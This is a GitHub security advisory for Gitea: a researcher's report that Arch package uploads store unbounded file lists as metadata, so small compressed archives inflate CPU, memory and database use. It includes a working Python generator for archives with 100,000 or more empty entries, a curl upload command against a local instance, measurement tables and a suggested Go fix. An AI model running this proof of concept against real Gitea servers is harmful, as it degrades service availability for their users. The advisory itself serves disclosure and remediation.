# [M] Gitea: Unbounded Arch package file metadata can cause resource amplification in Gitea package uploads

## Summary
Severity: Medium
Advisory: GHSA-9mq6-mqjj-c2c5
CVE: CVE-2026-59763
CWE: CWE-770
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-21
Source: https://github.com/advisories/GHSA-9mq6-mqjj-c2c5
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=0 <1.27.0

## Details
## Summary

Hello Gitea Security Team,

Thank you for your continued work on Gitea. I would like to responsibly report a potential availability-impact issue that I observed in Gitea’s Arch package registry implementation.

During local testing, I noticed that Gitea records non-dot regular file entries from an uploaded Arch package archive into package file metadata. I could not identify an explicit limit on the number of recorded file entries or on the cumulative size of recorded file names before this metadata is serialized, stored, and later used during repository index generation.

As a result, a relatively small compressed `.pkg.tar.gz` archive may lead to significantly larger server-side metadata processing and storage. I tested this only against a local self-hosted Gitea instance and have not tested this against any third-party or production service.

## Suggested Severity

Suggested severity: Medium

Suggested CVSS 3.1 vector:

`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L`

Suggested CVSS score: 4.3

This assessment is only a suggestion. The issue appears to require an authenticated user with package publishing permission. However, once that condition is met, the behavior is reachable over the network, does not require user interaction, and may affect availability through amplified metadata parsing, serialization, database storage, and repository index generation.

## Affected Component

* Gitea package registry
* Arch package upload endpoint
* Arch package metadata parsing
* Arch repository index generation

## Technical Details

The upload flow appears to accept an Arch package archive, parse its contents, record file entries into package metadata, and later reuse that metadata when generating the Arch repository index.

The relevant flow appears to include:

* `routers/api/packages/arch/arch.go:46` accepts the upload stream.
* `routers/api/packages/arch/arch.go:55` copies the upload into a `HashedBuffer`.
* `routers/api/packages/arch/arch.go:62` parses the archive with `arch_module.ParsePackage`.
* `modules/packages/arch/metadata.go:149` appends each non-dot regular tar entry name to `files`.
* `modules/packages/arch/metadata.go:158` stores the full list as `p.FileMetadata.Files`.
* `routers/api/packages/arch/arch.go:77` JSON-marshals the file metadata.
* `routers/api/packages/arch/arch.go:143` persists the metadata as `arch_module.PropertyMetadata`.
* `services/packages/arch/repository.go:302` deserializes the metadata during index generation.
* `services/packages/arch/repository.go:365` joins the full file list into the generated `files` entry.

From my review, the package upload size limit can reduce the maximum compressed archive size that is accepted, but it does not appear to directly limit the number of file entries or the expanded metadata size for archives that remain below the compressed upload limit.

## Impact

An authenticated user with permission to publish Arch packages may be able to upload an archive containing a valid `.PKGINFO` file and a large number of empty regular file entries.

In my local test environment, Gitea accepted such packages and stored the full file list as package metadata. This caused the server-side metadata size and generated repository `files` index content to become much larger than the compressed upload size.

The practical impact appears to be resource amplification affecting:

* CPU usage during parsing and index generation
* memory usage during metadata handling
* database storage due to large serialized metadata
* repository index generation size and processing time

This seems most relevant for instances where untrusted or semi-trusted users are allowed to publish packages.

## Local Validation Results

I tested this only on a local self-hosted Gitea instance.

A 470,403 byte archive containing 100,000 empty file entries was accepted by the Arch package upload endpoint. It produced a 4,500,112 byte `arch.metadata` database property and a generated repository index whose `files` member contained 100,001 lines.

A larger 2,349,767 byte archive containing 500,000 empty file entries was also accepted in the default configuration. It produced a 22,500,112 byte `arch.metadata` database property and a generated repository `files` member with 500,001 lines.

## Proof of Concept

The following proof of concept is intended only for a local self-hosted test instance.

Save the following script as `generate_arch_metadata_test_package.py`:

```python
#!/usr/bin/env python3
from __future__ import annotations

import argparse
import gzip
import io
import tarfile
from pathlib import Path

PKGINFO = """pkgname = gitea-metadata-test
pkgbase = gitea-metadata-test
pkgver = 1.0.0-1
pkgdesc = Local metadata scaling test package
url = https://example.invalid/
packager = local test
arch = x86_64
license = MIT
builddate = 1714521600
size = 0
"""

def add_bytes(tar: tarfile.TarFile, name: str, data: bytes) -> None:
    info = tarfile.TarInfo(name=name)
    info.size = len(data)
    info.mode = 0o644
    tar.addfile(info, io.BytesIO(data))

def build_archive(output: Path, entries: int, name_width: int) -> None:
    output.parent.mkdir(parents=True, exist_ok=True)
    with output.open("wb") as raw:
        with gzip.GzipFile(fileobj=raw, mode="wb", compresslevel=9, mtime=0) as gz:
            with tarfile.open(fileobj=gz, mode="w|") as tar:
                add_bytes(tar, ".PKGINFO", PKGINFO.encode("utf-8"))
                for i in range(entries):
                    name = f"usr/share/gitea-metadata-test/{i:0{name_width}d}.txt"
                    add_bytes(tar, name, b"")

def main() -> None:
    parser = argparse.ArgumentParser(
        description="Generate a local Arch package test archive with many empty file entries.",
    )
    parser.add_argument("--entries", type=int, default=100000)
    parser.add_argument("--name-width", type=int, default=8)
    parser.add_argument("--output", type=Path, default=Path("gitea-metadata-test.pkg.tar.gz"))
    args = parser.parse_args()

    if args.entries < 1:
        raise SystemExit("--entries must be at least 1")
    if args.name_width < 1:
        raise SystemExit("--name-width must be at least 1")

    build_archive(args.output, args.entries, args.name_width)
    print(f"wrote {args.output} with {args.entries} regular file entries")

if __name__ == "__main__":
    main()
```

Generate a test archive:

```bash
python3 generate_arch_metadata_test_package.py \
  --entries 100000 \
  --output gitea-metadata-test-100k.pkg.tar.gz
```

Upload it to a local Gitea test instance with package publishing enabled:

```bash
curl -X PUT \
  -H "Authorization: token <TOKEN>" \
  --upload-file gitea-metadata-test-100k.pkg.tar.gz \
  http://127.0.0.1:3007/api/packages/packagebot/arch/bigrepo
```

Observed local result:

```text
HTTP_STATUS=201
TIME_TOTAL=0.482909
SIZE_UPLOAD=470403
```

## Additional Validation

Parser-only measurements:

| Entries | Compressed archive bytes | Parsed file entries | Metadata JSON bytes | Joined files bytes | Parse time |
| ------: | -----------------------: | ------------------: | ------------------: | -----------------: | ---------: |
|      25 |                      477 |                  25 |               1,237 |              1,074 |       0 ms |
|  10,000 |                   47,461 |              10,000 |             450,112 |            429,999 |      25 ms |
| 100,000 |                  470,403 |             100,000 |           4,500,112 |          4,299,999 |     264 ms |

Local Gitea upload measurements:

| Entries | Upload HTTP status | Upload time | Uploaded bytes | Stored metadata bytes | Stored file count | Repository index blob bytes | Extracted `files` lines |
| ------: | -----------------: | ----------: | -------------: | --------------------: | ----------------: | --------------------------: | ----------------------: |
|  10,000 |                201 |     0.243 s |         47,461 |               450,112 |            10,000 |                      27,267 |                  10,001 |
| 100,000 |                201 |     0.483 s |        470,403 |             4,500,112 |           100,000 |                     262,301 |                 100,001 |
| 500,000 |                201 |     1.798 s |      2,349,767 |            22,500,112 |           500,000 |                   1,306,465 |                 500,001 |

## Package Size Limit Behavior

I also tested `LIMIT_SIZE_ARCH=1MiB` with a non-admin package publisher.

| Entries | Upload bytes | Upload HTTP status | Stored metadata bytes | Notes                                                                    |
| ------: | -----------: | -----------------: | --------------------: | ------------------------------------------------------------------------ |
| 100,000 |      470,403 |                201 |             4,500,112 | Accepted because the compressed upload was below the package size limit. |
| 500,000 |    2,349,767 |                403 |            not stored | Rejected with `maximum allowed package type size exceeded`.              |

This suggests that the compressed package size limit helps reduce exposure, but it may not fully address metadata growth for highly compressible archives that stay below the configured upload limit.

## Expected Behavior

Gitea should ideally reject package archives whose expanded package metadata would require excessive server-side resources. It would be safer if this validation happened before the file list is serialized, persisted, or used during repository index generation.

## Suggested Remediation

One possible mitigation would be to add explicit bounds during Arch package metadata parsing before the file list is stored or used for repository index generation.

Potential controls could include:

* limiting the maximum number of regular file entries recorded in `FileMetadata.Files`
* limiting the cumulative byte length of recorded file names
* returning a clear 4xx validation error when an uploaded package exceeds those limits
* optionally making these limits configurable for instance operators
* adding regression tests for excessive file-entry count and excessive cumulative file-name size

For example, the validation could follow this general shape:

```go
const (
	maxArchMetadataFiles = 10000
	maxArchMetadataFileNameBytes = 1 << 20
)

var totalFileNameBytes int

// inside the tar entry loop
if !strings.HasPrefix(filename, ".") {
	totalFileNameBytes += len(hd.Name)
	if len(files) >= maxArchMetadataFiles || totalFileNameBytes > maxArchMetadataFileNameBytes {
		return nil, util.NewInvalidArgumentErrorf("arch package file metadata exceeds limit")
	}
	files = append(files, hd.Name)
}
```

This is only a suggested direction, and I understand the project may prefer a different threshold or design depending on compatibility and package registry requirements.

## Closing

Thank you for taking the time to review this report. Please let me know if any additional information would be helpful, such as the local test environment details, database inspection steps, or additional measurements with different limits.

I appreciate your work on maintaining Gitea and would be happy to help clarify or retest any proposed fix.

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-9mq6-mqjj-c2c5
- https://github.com/go-gitea/gitea/pull/38406
- https://github.com/go-gitea/gitea/pull/38426
- https://github.com/go-gitea/gitea/commit/de4b8277e9cb576f2315fb03b5ab6478b42a1d31
- https://github.com/go-gitea/gitea/commit/f69e15afe7496cc62e96dab244629c69eb31a7bf
- https://github.com/go-gitea/gitea
- https://github.com/go-gitea/gitea/releases/tag/v1.27.0
